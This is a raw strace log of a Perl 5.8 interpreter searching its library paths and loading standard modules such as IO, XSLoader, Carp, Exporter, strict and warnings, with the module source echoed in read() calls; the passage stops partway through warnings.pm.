5970  07:11:35.410658 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbf8ec250) = -1 ENOENT (No such file or directory)
5970  07:11:35.410676 stat64("/usr/local/lib/site_perl/5.8.8", 0xbf8ec250) = -1 ENOENT (No such file or directory)
5970  07:11:35.410723 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbf8ec250) = -1 ENOENT (No such file or directory)
5970  07:11:35.410754 stat64("/usr/local/lib/perl/5.8.7", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.410766 stat64("/usr/local/share/perl/5.8.7", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.410778 stat64("/usr/local/lib/perl/5.8.6", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.410809 stat64("/usr/local/share/perl/5.8.6", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.410835 stat64("/usr/local/lib/perl/5.8.4", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.410846 stat64("/usr/local/share/perl/5.8.4", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.410857 stat64("/usr/local/lib/perl/5.8.3", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.410888 stat64("/usr/local/share/perl/5.8.3", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.410900 stat64("/usr/local/lib/perl/5.8.2", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.410925 stat64("/usr/local/share/perl/5.8.2", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.410936 stat64("/usr/local/lib/perl/5.8.1", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.411077 stat64("/usr/local/share/perl/5.8.1", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.411091 stat64("/usr/local/lib/perl/5.8.0", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.411132 stat64("/usr/local/share/perl/5.8.0", 0xbf8ec390) = -1 ENOENT (No such file or directory)
5970  07:11:35.411155 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ec088) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.411169 _llseek(0, 0, [0], SEEK_CUR) = 0
5970  07:11:35.411181 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ec088) = -1 EBADF (Bad file descriptor)
5970  07:11:35.411191 _llseek(1, 0, 0xbf8ec0d0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
5970  07:11:35.411201 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ec088) = -1 EINVAL (Invalid argument)
5970  07:11:35.411225 _llseek(2, 0, 0xbf8ec0d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5970  07:11:35.411236 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
5970  07:11:35.411253 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ec148) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.411264 _llseek(1, 0, [0], SEEK_CUR) = 0
5970  07:11:35.411275 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
5970  07:11:35.411286 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
5970  07:11:35.411306 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
5970  07:11:35.411360 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
5970  07:11:35.411416 getppid()         = 5968
5970  07:11:35.411477 stat64("/etc/perl/IO.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.411491 stat64("/etc/perl/IO.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.411504 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.411528 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.411545 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.411557 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.411571 stat64("/usr/lib/perl5/IO.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.416996 stat64("/usr/lib/perl5/IO.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417045 stat64("/usr/share/perl5/IO.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417075 stat64("/usr/share/perl5/IO.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417088 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417101 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
5970  07:11:35.417122 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
5970  07:11:35.417137 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ebb58) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.417148 _llseek(6, 0, [0], SEEK_CUR) = 0
5970  07:11:35.417173 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
5970  07:11:35.417231 stat64("/etc/perl/XSLoader.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417244 stat64("/etc/perl/XSLoader.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417258 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417271 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417285 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417298 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417312 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417324 stat64("/usr/lib/perl5/XSLoader.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417337 stat64("/usr/share/perl5/XSLoader.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417349 stat64("/usr/share/perl5/XSLoader.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417363 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.417376 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
5970  07:11:35.417396 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.417410 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.417428 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.417449 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
5970  07:11:35.417667 brk(0x8195000)    = 0x8195000
5970  07:11:35.418049 _llseek(8, 3407, [3407], SEEK_SET) = 0
5970  07:11:35.418067 _llseek(8, 0, [3407], SEEK_CUR) = 0
5970  07:11:35.418077 close(8)          = 0
5970  07:11:35.418124 stat64("/etc/perl/Carp.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418143 stat64("/etc/perl/Carp.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418158 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418171 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418185 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418198 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418212 stat64("/usr/lib/perl5/Carp.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418224 stat64("/usr/lib/perl5/Carp.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418237 stat64("/usr/share/perl5/Carp.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418249 stat64("/usr/share/perl5/Carp.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418263 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418275 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418289 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.418302 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
5970  07:11:35.418324 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.418338 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.418350 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.418383 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
5970  07:11:35.418927 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
5970  07:11:35.418973 read(8, "", 4096) = 0
5970  07:11:35.418985 close(8)          = 0
5970  07:11:35.419008 stat64("/etc/perl/Exporter.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419035 stat64("/etc/perl/Exporter.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419049 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419062 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419077 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419090 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419104 stat64("/usr/lib/perl5/Exporter.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419116 stat64("/usr/lib/perl5/Exporter.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419129 stat64("/usr/share/perl5/Exporter.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419142 stat64("/usr/share/perl5/Exporter.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419155 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419168 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419182 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419195 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
5970  07:11:35.419216 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.419231 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.419242 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.419259 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
5970  07:11:35.419786 _llseek(8, 2217, [2217], SEEK_SET) = 0
5970  07:11:35.419803 _llseek(8, 0, [2217], SEEK_CUR) = 0
5970  07:11:35.419813 close(8)          = 0
5970  07:11:35.419904 stat64("/etc/perl/strict.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419922 stat64("/etc/perl/strict.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419935 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419949 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419963 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419975 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.419990 stat64("/usr/lib/perl5/strict.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420002 stat64("/usr/lib/perl5/strict.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420015 stat64("/usr/share/perl5/strict.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420027 stat64("/usr/share/perl5/strict.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420041 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420053 stat64("/usr/lib/perl/5.8/strict.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420067 stat64("/usr/share/perl/5.8/strict.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420080 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
5970  07:11:35.420101 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.420116 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.420132 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.420151 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
5970  07:11:35.420293 _llseek(8, 598, [598], SEEK_SET) = 0
5970  07:11:35.420307 _llseek(8, 0, [598], SEEK_CUR) = 0
5970  07:11:35.420317 close(8)          = 0
5970  07:11:35.420356 stat64("/etc/perl/warnings.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420386 stat64("/etc/perl/warnings.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420426 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420439 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420470 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420483 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420497 stat64("/usr/lib/perl5/warnings.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420509 stat64("/usr/lib/perl5/warnings.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420522 stat64("/usr/share/perl5/warnings.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420535 stat64("/usr/share/perl5/warnings.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420548 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420561 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420574 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.420587 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
5970  07:11:35.420609 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.420623 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.420635 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.420653 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    